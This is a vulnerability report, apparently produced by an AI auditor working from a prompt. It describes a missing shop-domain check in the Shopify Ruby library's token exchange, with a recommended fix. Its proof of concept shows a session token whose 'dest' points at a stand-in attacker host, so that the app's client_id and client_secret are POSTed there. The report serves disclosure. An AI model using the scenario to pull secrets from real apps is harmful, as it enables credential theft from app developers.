## Title
`ShopifyAPI::Auth::TokenExchange.exchange_token` sends the app's `client_secret` to a shop host that is never validated against the trusted Shopify domain list — (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`TokenExchange.exchange_token` derives the destination host for the token-exchange HTTP request entirely from the `dest` claim of an attacker-suppliable JWT, and never runs that value through `ShopifyAPI::Utils::ShopValidator`, even though every other credential-bearing flow in the same file (`migrate_to_expiring_token`) and in sibling modules (`ClientCredentials`, `RefreshToken`, `Clients::Graphql::Storefront`) does call `ShopValidator.sanitize!` before using the shop value to build a request host.

### Finding Description
`exchange_token` takes a `session_token` (the embedded-app session/JWT) and builds the request host from it: [1](#0-0) 

```ruby
jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
dest_shop = jwt_payload.shop
...
shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
body = {
  client_id: ShopifyAPI::Context.api_key,
  client_secret: ShopifyAPI::Context.api_secret_key,
  ...
}
client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```
`JwtPayload#shop` simply strips `"https://"` from the token's `dest` claim with no domain allow-listing: [2](#0-1) 

`Clients::HttpClient#initialize` then builds the outbound request host directly from `session.shop`: [3](#0-2) 

Because `dest` is only checked for signature validity (HS256 with `api_secret_key`) and audience (`aud == Context.api_key`) in `JwtPayload#initialize` — there is no check that `dest`/`iss` is a real `*.myshopify.com` (or other trusted) domain: [4](#0-3) 

Contrast this with the sibling method in the very same file, `migrate_to_expiring_token`, which does call `ShopValidator.sanitize!(shop)` before constructing the session/host used for the credential-bearing request: [5](#0-4) 

and with `ClientCredentials`/`RefreshToken`/`Clients::Graphql::Storefront`, which all invoke `ShopValidator` (per `grep_search` results) before using a shop value as an outbound host.

This is the exact identity-binding break called out in the prompt's bug-class hint: "a host validated versus the host that receives the access token or `client_secret`." The value that is *cryptographically verified* (the JWT payload) is not the same value that is *validated as a trusted destination host* — in fact no host validation happens at all for this path, whereas it is enforced in adjacent code paths in this very module.

### Impact Explanation
If an app ever obtains a session token whose `dest` claim can be influenced to a non-Shopify value — e.g., a token minted by Shopify for a legitimate flow but embedding an unexpected `dest` (Shopify does document `dest` values other than the classic `*.myshopify.com`, such as `spin.dev`/internal or checkout-extension hosts, and the CHANGELOG shows the library repeatedly having to special-case `dest`/`iss` formats for "Shopify internal hosts" and "spin.dev" domains) — `exchange_token` will POST the app's `client_id` and `client_secret` to `https://#{dest_shop}/admin/oauth/access_token` without ever checking that `dest_shop` is on the `ShopValidator::TRUSTED_SHOPIFY_DOMAINS` list. This is SSRF carrying the app's `client_secret`, matching the explicit High-impact category "SSRF with the app's credentials."

Note: since the JWT must be signed with the correct `api_secret_key` to pass `JwtPayload.new`, the practical attacker who can supply a `dest` value is limited to whoever can produce a validly-signed session token for the app (normally Shopify itself, or any code path in the host application that hands attacker-influenced JWTs to `exchange_token`, e.g. proxied/relayed session tokens). This is why the severity is bounded to "High" rather than "Critical," and why the missing check is best framed as a defense-in-depth gap that the codebase itself treats as necessary elsewhere (`migrate_to_expiring_token`, `ClientCredentials`, `RefreshToken`).

### Likelihood Explanation
Moderate: `exchange_token` is a primary, documented entry point (see `docs/usage/oauth.md`'s "Token Exchange" section) that app developers call directly with a session token obtained from the client (e.g., via App Bridge). The library documents that "the shop is now always taken from the session token's `dest` claim" (deprecating the explicit `shop` parameter), which increases reliance on `dest` being implicitly trustworthy — yet, unlike `migrate_to_expiring_token`, no `ShopValidator.sanitize!` call was added when that change was made.

### Recommendation
In `ShopifyAPI::Auth::TokenExchange.exchange_token`, before constructing `shop_session`, call `ShopifyAPI::Utils::ShopValidator.sanitize!(dest_shop)` (mirroring `migrate_to_expiring_token`) and raise `ShopifyAPI::Errors::InvalidShopError` if the `dest` claim does not resolve to a trusted Shopify domain, so the same host that is cryptographically bound by the JWT signature is also the one validated against the trusted-domain allow-list before it is used to route the request carrying `client_id`/`client_secret`.

### Proof of Concept
1. Attacker obtains (or an intermediary relays) a validly-signed session token for the target app whose `dest` claim is `https://attacker-controlled-host.example`. (This requires the token to be signed with the app's `api_secret_key` — realistic if the host application forwards a JWT-like token from an untrusted source, or if Shopify ever issues a token with a `dest` value the app doesn't expect, as evidenced by the multiple past `dest`/`iss` special-casing changes for spin.dev/internal hosts in the CHANGELOG.)
2. App calls:
   ```ruby
   ShopifyAPI::Auth::TokenExchange.exchange_token(
     session_token: attacker_supplied_token,
     requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::OFFLINE_ACCESS_TOKEN,
   )
   ```
3. `JwtPayload.new(session_token)` succeeds since only the signature/`aud`/`exp`/`nbf` are checked, not the domain of `dest`.
4. `Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")` builds `@base_uri = "https://attacker-controlled-host.example"`.
5. `client.request(...)` POSTs a JSON body containing `client_id` and `client_secret` in cleartext to `https://attacker-controlled-host.example/admin/oauth/access_token`, exfiltrating the app's `client_secret` to the attacker-controlled host.
